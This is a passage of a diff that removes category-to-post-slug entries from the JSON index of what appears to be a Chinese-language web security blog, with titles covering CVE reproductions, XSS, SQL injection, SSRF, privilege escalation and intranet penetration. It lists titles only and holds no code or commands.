-        "mongodblou-dong-fu-xian-cve-2025-14847",
-        "redis-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2025-49844",
-        "apache-solr-rcelou-dong-fu-xian",
-        "log4j2-cve-2021-44228lou-dong-fu-xian",
-        "fastjsonfan-xu-lie-hua-lou-dong-1.2.24ban-ben",
-        "cve-2025-55182de-fu-xian-yu-xiu-fu",
-        "spring4shell-cve-2022-22965yuan-li-ji-fu-xian",
-        "cve-2026-24061-telnetyuan-cheng-ren-zheng-rao-guo",
-        "cve-2025-55725",
-        "apache-struts2-ognl-rcezhu-ru"
-      ],
-      "page": 1
-    },
-    "RCE": {
-      "dir_name": "RCE",
-      "posts": [
-        "ld-preload-bypass-rce",
-        "apache-struts2-ognl-rcezhu-ru",
-        "rce-vulnerability-exploitation-bypass-techniques"
-      ],
-      "page": 1
-    },
-    "护网": {
-      "dir_name": "护网",
-      "posts": [
-        "护网面经"
-      ],
-      "page": 1
-    },
-    "内网渗透": {
-      "dir_name": "内网渗透",
-      "posts": [
-        "2.msf-cobaltstrikeshi-xian-nei-wang-socksdai-li-zhuan-fa-shang-xian"
-      ],
-      "page": 1
-    },
-    "环境搭建": {
-      "dir_name": "环境搭建",
-      "posts": [
-        "nei-wang-huan-jing-da-jian-zhi-dan-yu-da-jian"
-      ],
-      "page": 1
-    },
-    "云上攻防": {
-      "dir_name": "云上攻防",
-      "posts": [
-        "3-yun-yuan-sheng-dockertao-yi"
-      ],
-      "page": 1
-    },
-    "burpsuite靶场": {
-      "dir_name": "burpsuite靶场",
-      "posts": [
-        "1.jwtshi-yan-ba-chang",
-        "shang-ye-gui-ze-zhi-xing-bu-dang"
-      ],
-      "page": 1
-    },
-    "业务逻辑漏洞": {
-      "dir_name": "业务逻辑漏洞",
-      "posts": [
-        "1-qian-yue-lou-dong",
-        "2-gao-bing-fa"
-      ],
-      "page": 1
-    },
-    "top10": {
-      "dir_name": "top10",
-      "posts": [
-        "xss-defense-csp-httponly-filter",
-        "xxe-injection-analysis-detection-defense",
-        "ctf-file-upload-bypass-and-payloads",
-        "ssrf-vulnerability-principles-bypass-and-defense-guide",
-        "xss-exploitation-cookie-theft-business-logic-and-phishing",
-        "xss-vulnerability-comprehensive-guide-reflected-stored-dom",
-        "advanced-xss-mxss-uxss-svg-pdf-flash-exploitation",
-        "xss-filter-bypass-techniques-and-waf-evasion",
-        "jsonp-data-leakage-and-clickjacking-defense",
-        "file-inclusion-vulnerability-guide",
-        "csrf-attack-detection-and-defense",
-        "file-upload-security-architecture-guide",
-        "sql-blind-injection-techniques",
-        "ssrf-protocols-gopher-internal-services",
-        "sql-injection-mysql-practice",
-        "sql-injection-request-types-php-mysql",
-        "file-and-directory-security-vulnerabilities",
-        "file-upload-vulnerability-complete-guide"
-      ],
-      "page": 1
-    },
-    "XSS": {
-      "dir_name": "XSS",
-      "posts": [
-        "xss-defense-csp-httponly-filter",
-        "xss-exploitation-cookie-theft-business-logic-and-phishing",
-        "xss-vulnerability-comprehensive-guide-reflected-stored-dom",
-        "advanced-xss-mxss-uxss-svg-pdf-flash-exploitation",
-        "xss2",
-        "xss-filter-bypass-techniques-and-waf-evasion",
-        "jsonp-data-leakage-and-clickjacking-defense",
-        "xss1",
-        "xss4",
-        "xss3",
-        "xss6"
-      ],
-      "page": 1
-    },
-    "Web安全": {
-      "dir_name": "Web安全",
-      "posts": [
-        "ssrf-vulnerability-principles-bypass-and-defense-guide",
-        "ld-preload-bypass-rce",
-        "xss-vulnerability-comprehensive-guide-reflected-stored-dom",
-        "advanced-xss-mxss-uxss-svg-pdf-flash-exploitation",
-        "xss1",
-        "ssrf-protocols-gopher-internal-services",
-        "file-inclusion-vulnerability-guide",
-        "sql-blind-injection-techniques",
-        "rce-vulnerability-exploitation-bypass-techniques",
-        "sql-injection-request-types-php-mysql",
-        "ctf-file-upload-bypass-and-payloads",
-        "xss2",
-        "csrf-attack-detection-and-defense",
-        "file-and-directory-security-vulnerabilities",
-        "xss6",
-        "xss-exploitation-cookie-theft-business-logic-and-phishing",
-        "xss-filter-bypass-techniques-and-waf-evasion",
-        "file-upload-security-architecture-guide",
-        "xss4",
-        "sql-injection-mysql-practice",
-        "xss3",
-        "file-upload-vulnerability-complete-guide",
-        "sqlmap-cheatsheet-and-advanced-usage"
-      ],
-      "page": 1
-    },
-    "XXE": {
-      "dir_name": "XXE",
-      "posts": [
-        "xxe-injection-analysis-detection-defense",
-        "test",
-        "xxe1"
-      ],
-      "page": 1
-    },
-    "杂项": {
-      "dir_name": "杂项",
-      "posts": [
-        "hello-halo",
-        "4.ji-suan-ji-yong-hu-ti-quan",
-        "ji-zhi-yan-zheng-pian-chong-ding-xiang-fa-song-xiang-ying-zhuang-tai-ma-tiao-guo-bu-zou-yan-zheng-ma-hui-chuan-mei-ju",
-        "4.capabilityneng-li_shu-ju-ku-ti-quan_ld_preloadjia-zai",
-        "rce",
-        "yun-fu-wu-qi-git-tui-song-wen-ti-yu-jie-jue",
-        "xss6",
-        "sql4",
-        "up3",
-        "sql-advanced-injection-second-order-stacked-oob",
-        "sql2",
-        "xss1",
-        "3.nfs_path_cronti-quan",
-        "1.nei-he-lou-dong-ti-quan",
-        "3.shu-ju-ku-ti-quan",
-        "qian-tan-dian-zi-you-jian-wei-zao",
-        "cve-2025-8088-winrar-directory-traversal-exploit"
-      ],
-      "page": 1
-    },
-    "文件安全": {
-      "dir_name": "文件安全",
-      "posts": [
-        "ctf-file-upload-bypass-and-payloads",
-        "file-inclusion-vulnerability-guide",
-        "file-upload-security-architecture-guide",
-        "file-and-directory-security-vulnerabilities",
-        "file-upload-vulnerability-complete-guide"
-      ],
-      "page": 1
-    },
-    "PHP安全": {
-      "dir_name": "PHP安全",
-      "posts": [
-        "file-inclusion-vulnerability-guide"
-      ],
-      "page": 1
-    },
-    "SQL注入": {
-      "dir_name": "SQL注入",
-      "posts": [
-        "sql-blind-injection-techniques",
-        "sql-injection-request-types-php-mysql",
-        "sql-injection-mysql-practice",
-        "sqlmap-cheatsheet-and-advanced-usage"
-      ],
-      "page": 1
-    },
-    "SSRF": {
-      "dir_name": "SSRF",
-      "posts": [
-        "ssrf-vulnerability-principles-bypass-and-defense-guide",
-        "ssrf-protocols-gopher-internal-services",
-        "ssrf2",
-        "ssrf1"
-      ],
-      "page": 1
-    },
-    "跨域安全": {
-      "dir_name": "跨域安全",
-      "posts": [
-        "xss6"
-      ],
-      "page": 1
-    },
-    "移动安全": {
-      "dir_name": "移动安全",
-      "posts": [
-        "app1",
-        "app3",
-        "app2"
-      ],
-      "page": 1
-    },
-    "逆向工程": {
-      "dir_name": "逆向工程",
-      "posts": [
-        "app3"
-      ],
-      "page": 1
-    },
-    "CSRF": {
-      "dir_name": "CSRF",
-      "posts": [
-        "csrf"
-      ],
-      "page": 1
     }
   }
 }
